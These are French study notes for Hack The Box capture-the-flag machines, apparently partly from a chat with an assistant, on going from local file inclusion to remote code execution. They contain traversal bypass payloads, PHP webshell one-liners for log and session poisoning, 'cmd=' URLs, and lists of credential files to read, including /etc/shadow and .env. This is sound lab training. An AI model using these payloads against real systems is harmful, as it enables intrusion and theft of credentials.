Exemple machine Nineveh
```http
# url de base
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt

# Manipulation d'une application qui permettait de la nommé ninevehNotes il y avait un code php pour faire une requete system cmd
# Exploitation du paramètre notes
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes&cmd=id
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes&cmd=cat /etc/passwd
http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes&cmd=cat %2fetc%2fpasswd
```

Voici le carnet complet :

---

**Process LFI — Enumération à Exploitation**

```
1. Identifier le paramètre
   ?page= ?file= ?path= ?template= ?lang= ?view= ?notes=

2. Valider la LFI
   /etc/passwd
   /etc/hosts
   /etc/issue

3. Tester les filtres
   ../../../etc/passwd
   ....//....//etc/passwd
   %2e%2e%2f%2e%2e%2fetc%2fpasswd
   /etc/passwd%00 (null byte, PHP < 5.3)
   mot_clé_requis/../../etc/passwd (filtre sur string)

4. Escalader vers RCE
```

**Vecteurs RCE depuis LFI :**

```bash
# Log poisoning Apache
/var/log/apache2/access.log
User-Agent: <?php system($_GET['cmd']); ?>

# Log poisoning SSH
ssh '<?php system($_GET["cmd"]); ?>'@IP
/var/log/auth.log

# PHP filter (lire source)
php://filter/convert.base64-encode/resource=index.php

# PHP input
php://input + POST: <?php system('id'); ?>

# /proc/self/environ
/proc/self/environ

# Session poisoning
/var/lib/php/sessions/sess_SESSIONID

# Upload + LFI
upload shell.php → LFI vers le chemin uploadé

# DB injection (Nineveh method)
phpLiteAdmin/SQLite → créer DB .php → LFI
```

**Chemins utiles à tester :**

```bash
# Configs système
/etc/passwd
/etc/shadow
/etc/hosts
/etc/crontab
/etc/knockd.conf
/etc/ssh/sshd_config

# Logs
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/mail.log
/var/log/vsftpd.log

# PHP sessions
/var/lib/php/sessions/
/tmp/sess_SESSIONID

# Configs applis
/var/www/html/config.php
/var/www/html/.env
```

---

**Liste de machines HTB par progression LFI :**

| Machine | Difficulté | Technique |
|---------|-----------|-----------|
| Poison | Medium FreeBSD | LFI + log poisoning + VNC ✅ |
| Nineveh | Medium Linux | LFI + phpLiteAdmin RCE ✅ |
| Networked | Easy Linux | File upload bypass + LFI |
| Traceback | Easy Linux | LFI + backdoor webshell |
| Laboratory | Easy Linux | GitLab LFI → RCE |
| Timing | Medium Linux | LFI + source code review |
| Pikaboo | Hard Linux | LFI + log poisoning avancé |
| Ophiuchi | Medium Linux | SSTI proche LFI |

**Ordre recommandé pour toi :**

```
Networked → Timing → Pikaboo
```

Networked est la prochaine étape logique — file upload + LFI, technique que tu n'as pas encore faite proprement.
Oui exactement.

Une fois la LFI validée avec `/etc/passwd`, tu utilises le même paramètre pour lire tous ces fichiers.

Exemple concret sur Nineveh :
```
manage.php?notes=/etc/passwd/nineveh
manage.php?notes=/var/log/auth.log/nineveh
manage.php?notes=/etc/crontab/nineveh
```

**Pourquoi c'est utile :**

```
/etc/passwd        → liste des users, leurs shells
/etc/crontab       → crons root = vecteur privesc
/var/log/auth.log  → log poisoning SSH possible ?
/etc/ssh/sshd_config → SSH autorisé ? clés acceptées ?
/var/www/html/config.php → credentials base de données
/proc/self/environ → variables d'env + User-Agent injectable
```

**Réflexe à avoir :**

Dès que tu valides une LFI → parcourir ces chemins systématiquement avant de chercher un vecteur RCE. Les configs et logs te donnent souvent des credentials ou des vecteurs d'escalade directement.

Tu veux qu'on intègre ça dans ta checklist post-LFI ?
